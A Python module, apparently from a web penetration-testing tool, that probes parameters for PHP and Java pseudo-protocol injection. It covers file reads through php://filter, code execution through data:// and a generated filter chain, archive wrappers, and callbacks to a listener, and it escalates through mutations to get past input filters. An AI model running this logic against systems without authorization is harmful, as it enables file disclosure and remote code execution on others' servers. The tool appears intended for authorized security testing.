"""The pseudo-protocol state graph.

    probe.read ---> probe.code ---> probe.archive ---> probe.remote
         |                                                   |
         +-----------------------> report <------------------+

A parameter that holds a path is a dispatch point: whichever runtime sits behind
it decides what `php://filter` or `jar:http://...!/` means. So the graph asks in
the order that costs least and settles most - a local read first, because one
request tells you whether anything is passed through at all; code execution next,
because it is the outcome that matters; archives after that, because they need
something already uploaded; and reaching out last, because it needs a listener
and only makes sense once the parameter is known to carry something.

Each action stops at the first wrapper that answers. The evidence is a string
only the target's own behaviour produces: file contents, an expanded filter, a
marker this run invented, or a connection back to the listener.
"""

from __future__ import annotations

import base64
import secrets

from ...core.filters import php_runner
from ...core.mutate import Kind, Variant
from ...engine.blackboard import Confidence
from ...engine.inject import (
    candidates as _candidates,
    inject as _inject,
    inject_escalating as _inject_escalating,
    note_finding as _emit_finding,
    record as _record,
)
from ...engine.statemachine import Action, RunContext, State, StateGraph, Transition
from .seeds import (
    FILE_TARGETS,
    GENERIC_REMOTE,
    JAVA_URL,
    PHP_ARCHIVE,
    PHP_CODE,
    PHP_FILTER_READ,
    PHP_PLAIN_READ,
    Wrapper,
    php_code,
)

FINDINGS = "proto.findings"
WRAPPERS = "proto.wrappers"
RUNTIME = "proto.runtime"
PROVEN = "proto.proven"

# Families whose payloads read a file the host keeps, not one the application
# owns. Asking a Java file reader for `index.php` proves nothing.
_SYSTEM_FAMILIES = frozenset({"java-read"})


# --------------------------------------------------------------------- helpers


def _note_finding(ctx: RunContext, entry: dict) -> None:
    _emit_finding(ctx, FINDINGS, entry)


def _read_wrappers() -> list[Wrapper]:
    """Local reads, most conclusive first."""
    return [w for w in PHP_FILTER_READ + PHP_PLAIN_READ + JAVA_URL if not w.remote]


def _remote_wrappers() -> list[Wrapper]:
    return [w for w in PHP_ARCHIVE + JAVA_URL if w.remote] + list(GENERIC_REMOTE)


def _file_targets(ctx: RunContext) -> list[str]:
    configured = ctx.config.get("read") or []
    return list(configured) or list(FILE_TARGETS)


def _targets_for(wrapper: Wrapper, targets: list[str]) -> list[str]:
    """Which paths to ask this wrapper for.

    A file the application serves is the right first question for a PHP filter,
    and the wrong one for a Java file reader, which cannot see the web root at
    all. One target per wrapper keeps the request count honest.
    """
    if not targets:
        return []
    if wrapper.family in _SYSTEM_FAMILIES:
        system = [t for t in targets if t.startswith("/")]
        return (system or targets)[:1]
    return targets[:1]


def _runtime_of(wrapper: Wrapper) -> str:
    if wrapper.family.startswith("php"):
        return "php"
    if wrapper.family.startswith("java"):
        return "java"
    return "unknown"


def _proven(ctx: RunContext, wrapper: Wrapper, param, variant, request, verdict, note: str = "") -> None:
    """Record a wrapper that answered, as a finding and on the board."""
    entry = {
        "name": wrapper.name,
        "param": param.key(),
        "payload": variant.value,
        "generation": variant.generation,
        "request": request.to_bytes().decode("latin-1"),
        "evidence": note or verdict.reason,
        "detail": getattr(verdict, "detail", ""),
        "family": wrapper.family,
        "wrapper_note": wrapper.note,
    }
    _note_finding(ctx, entry)
    _record(ctx, WRAPPERS, wrapper.name, evidence=note or verdict.reason, confidence=Confidence.CONFIRMED)
    ctx.blackboard.set(
        PROVEN,
        True,
        evidence=f"{wrapper.name} answered through {param.key()}",
        confidence=Confidence.CONFIRMED,
    )
    runtime = _runtime_of(wrapper)
    if runtime != "unknown":
        ctx.blackboard.set(
            RUNTIME,
            runtime,
            evidence=f"{wrapper.name} is a {runtime} wrapper and it worked",
            confidence=Confidence.LIKELY,
        )


def _try_wrapper(ctx: RunContext, param, wrapper: Wrapper, action: str, targets: list[str], escalate: bool = True) -> bool:
    """Send one wrapper and judge what came back. True if it answered.

    `escalate=False` sends the wrapper exactly as written and moves on. That is
    how the first pass reaches every family cheaply: a payload a filter refuses
    costs one request instead of a dozen rewrites, and the families further down
    the list get their turn before the budget is spent on the first one.
    """
    for target in _targets_for(wrapper, targets):
        payload = wrapper.payload.format(file=target)
        if escalate:
            outcome = _inject_escalating(ctx, param, payload, action, kind=Kind.PROTOCOL)
        else:
            request, exchange = _inject(ctx, param, payload, action)
            outcome = (request, exchange, Variant(value=payload, generation=0))
        if outcome is None:
            continue
        request, exchange, variant = outcome
        if exchange.response.error:
            continue
        verdict = ctx.judge.signature(exchange.response, wrapper.signatures, variant.value)
        if not verdict.confirmed:
            continue
        _proven(ctx, wrapper, param, variant, request, verdict)
        return True
    return False


# --------------------------------------------------------------------- actions


def probe_read(ctx: RunContext) -> None:
    """Ask for a file through every wrapper that reads one.

    Two passes. The first sends every wrapper as written, so every family gets a
    turn before any request is spent on rewrites - a rule set that refuses one
    form of one wrapper would otherwise eat the whole budget before the next
    family is even tried. The second pass goes back over what did not answer and
    climbs the mutation generations, which is where a filter that only knows the
    usual spelling is defeated.
    """
    wrappers = _read_wrappers()
    targets = _file_targets(ctx)
    for param in _candidates(ctx):
        if ctx.stopped:
            return
        answered: set[str] = set()
        for wrapper in wrappers:
            if ctx.stopped:
                return
            if _try_wrapper(ctx, param, wrapper, "probe.read", targets, escalate=False):
                answered.add(wrapper.name)
        for wrapper in wrappers:
            if ctx.stopped:
                return
            if wrapper.name in answered:
                # It already answered as written; there is nothing left to climb.
                continue
            _try_wrapper(ctx, param, wrapper, "probe.read", targets, escalate=True)


def probe_code(ctx: RunContext) -> None:
    """Ask the target to run something, through the wrappers that do that.

    The marker is invented per run, so a page that echoes our input cannot be
    mistaken for a page that executed it. That distinction is the whole reason
    this action exists separately from the read probes: `data://` reaching a
    parser and `data://` being executed look identical until something only the
    target could produce comes back.
    """
    marker = f"ik{secrets.token_hex(4)}"
    encoded = base64.b64encode(php_code(marker).encode()).decode()
    for param in _candidates(ctx):
        if ctx.stopped:
            return
        for wrapper in PHP_CODE:
            if ctx.stopped:
                return
            payload = wrapper.payload.format(code=encoded, callback="", file="", upload="")
            outcome = _inject_escalating(ctx, param, payload, "probe.code", kind=Kind.PROTOCOL)
            if outcome is None:
                continue
            request, exchange, variant = outcome
            if exchange.response.error:
                continue
            if marker not in exchange.response.text:
                continue
            reason = f"the marker {marker} came back"
            _proven(ctx, wrapper, param, variant, request, _Evidence(reason), note=reason)
            return


def probe_archive(ctx: RunContext) -> None:
    """Reach a file through a container, when one is known to be there."""
    upload = ctx.config.get("upload") or ""
    targets = _file_targets(ctx)
    for param in _candidates(ctx):
        if ctx.stopped:
            return
        for wrapper in PHP_ARCHIVE:
            if ctx.stopped:
                return
            if wrapper.remote:
                # Reaching out belongs to probe.remote, where the proof is the
                # connection rather than the body.
                continue
            if wrapper.needs == "upload" and not upload:
                continue
            payload = wrapper.payload.format(file=targets[0] if targets else "", upload=upload)
            outcome = _inject_escalating(ctx, param, payload, "probe.archive", kind=Kind.PROTOCOL)
            if outcome is None:
                continue
            request, exchange, variant = outcome
            if exchange.response.error:
                continue
            verdict = ctx.judge.signature(exchange.response, wrapper.signatures, variant.value)
            if not verdict.confirmed:
                continue
            _proven(ctx, wrapper, param, variant, request, verdict)


def probe_remote(ctx: RunContext) -> None:
    """Payloads whose proof is a connection back, not a body.

    `jar:` downloads an archive before it does anything else, and a JNDI lookup
    dials the address it is given. Neither answers in the response - the target's
    own network makes the request, which is also why this is the payload family
    that reaches past a filter judging the string.
    """
    oob = ctx.oob
    if oob is None or not getattr(oob, "running", False):
        ctx.blackboard.mark_not_covered(
            "probe.remote", "no listener was given, so the remote wrappers were skipped"
        )
        return

    wait = float(ctx.config.get("oob_wait", 5.0))
    for param in _candidates(ctx):
        if ctx.stopped:
            return
        for wrapper in _remote_wrappers():
            if ctx.stopped:
                return
            url, token = oob.new_url(f"{wrapper.name}:{param.key()}")
            authority = url.split("://", 1)[-1]
            payload = wrapper.payload.format(callback=authority, file="", upload="", code="")
            outcome = _inject_escalating(ctx, param, payload, "probe.remote", kind=Kind.PROTOCOL)
            if outcome is None:
                continue
            request, exchange, variant = outcome
            hits = oob.wait(token, timeout=wait)
            if not hits:
                continue
            _proven(
                ctx,
                wrapper,
                param,
                variant,
                request,
                _Evidence("the target called back"),
                note=f"the target connected back: {hits[0].detail}",
            )


class _Evidence:
    """A verdict stand-in for evidence that is not a body.

    A callback, or a marker this run invented, is conclusive in a way a
    signature match is not - so it does not need the judge to weigh it.
    """

    def __init__(self, reason: str, detail: str = "") -> None:
        self.reason = reason
        self.detail = detail


def classify(ctx: RunContext) -> None:
    """Say what the parameter turned out to be, or that nothing came through."""
    if not ctx.blackboard.get(PROVEN):
        ctx.blackboard.set(
            RUNTIME,
            "unknown",
            evidence="no wrapper produced evidence this run",
            confidence=Confidence.INCONCLUSIVE,
        )
        return
    runtime = ctx.blackboard.get(RUNTIME) or "unknown"
    ctx.log(f"   the parameter accepts {runtime} wrappers")


def exploit_filter_chain(ctx: RunContext) -> None:
    """Turn a read into execution, with nothing written to disk.

    A parameter that reaches `include()` and accepts `php://filter` is not a file
    reader, it is a code runner waiting for the right stream. The chain built
    here manufactures its payload byte by byte - iconv conversions insert one
    base64 character at a time and each decode keeps only what it recognises - so
    what the application includes is content that exists nowhere on the target.

    Off unless `--exploit` is given, for the same reason the other chains are:
    running code on someone's server is the operator's decision.
    """
    if not ctx.config.get("exploit"):
        ctx.blackboard.mark_not_covered(
            "exploit.filter_chain", "not requested; pass --exploit to run code on the target"
        )
        return

    marker = f"ik{secrets.token_hex(4)}"
    chain = php_runner(f"echo '{marker}';")
    for param in _candidates(ctx):
        if ctx.stopped:
            return
        outcome = _inject_escalating(ctx, param, chain, "exploit.filter_chain", kind=Kind.PROTOCOL)
        if outcome is None:
            continue
        request, exchange, variant = outcome
        if exchange.response.error:
            continue
        if marker not in exchange.response.text:
            continue
        reason = f"the marker {marker} came back from a payload built inside the stream"
        _proven(ctx, _CHAIN, param, variant, request, _Evidence(reason), note=reason)
        ctx.blackboard.set(
            "proto.rce",
            True,
            evidence=reason,
            confidence=Confidence.CONFIRMED,
        )
        return


# The chain is not in the seed tables - it is built at run time - so it needs a
# name of its own to be reported under.
_CHAIN = Wrapper(
    "php-filter-chain",
    "php://filter/<generated>",
    family="php-exec",
    signatures=(),
    note="a filter chain that builds its payload in the stream; no file, no upload",
)


def report_summary(ctx: RunContext) -> None:
    """Print what the run proved, and be explicit when it proved nothing."""
    # The chain state is not entered without --exploit, so an action that never
    # ran has to be recorded here: leaving it out would read as "tested and
    # clean" when it means "never tested".
    if not ctx.config.get("exploit"):
        ctx.blackboard.mark_not_covered(
            "exploit.filter_chain", "not requested; pass --exploit to run code on the target"
        )

    proven = bool(ctx.blackboard.get(PROVEN))
    refusals = ctx.bypass.refusals()

    if proven:
        runtime = ctx.blackboard.get(RUNTIME) or "unknown"
        ctx.emit(f"  result: the parameter accepts pseudo-protocol wrappers ({runtime})")
    else:
        ctx.emit("  result: no wrapper produced evidence on this target")

    if refusals:
        ctx.emit(f"  filter: {refusals} requests were refused")
        if not proven:
            ctx.emit("    the input surface is filtered; a wrapper may still work through a rewrite")


# ----------------------------------------------------------------- graph shape


def build_graph(name: str = "proto") -> StateGraph:
    """Assemble the pseudo-protocol graph. Names are stable; session files use them."""
    graph = StateGraph(name=name, start="probe")
    graph.add(
        State(
            name="probe",
            description="what this parameter will accept, and what it will give back",
            actions=[
                Action("probe.read", "read a file through every wrapper that can", probe_read),
                Action("probe.code", "ask the target to run something", probe_code),
                Action("probe.archive", "reach a file through a container", probe_archive),
                Action("probe.remote", "plant a callback and see if the target dials it", probe_remote),
                Action("classify", "say what the parameter turned out to be", classify),
            ],
            transitions=[
                Transition(
                    "chain",
                    # Not "a PHP wrapper answered": the chain does not need a
                    # successful read, it needs include() and a runtime that
                    # accepts php://filter. Gating it on the reads means a filter
                    # that blocks every read also blocks the execution attempt -
                    # the one action that might still get through - and the run
                    # reports nothing while the useful payload was never sent.
                    lambda ctx: bool(ctx.config.get("exploit"))
                    and ctx.blackboard.get(RUNTIME) != "java",
                    "code execution was asked for, and the runtime is not known to be Java",
                ),
                Transition("finish", lambda ctx: True, "nothing further to ask"),
            ],
        )
    )
    graph.add(
        State(
            name="chain",
            description="build the payload inside the stream instead of on disk",
            actions=[
                Action("exploit.filter_chain", "run code through a generated filter chain", exploit_filter_chain)
            ],
            transitions=[Transition("finish", lambda ctx: True, "done")],
        )
    )
    graph.add(
        State(
            name="finish",
            description="summarise what the run proved",
            actions=[Action("report.summary", "print the result", report_summary)],
        )
    )
    return graph
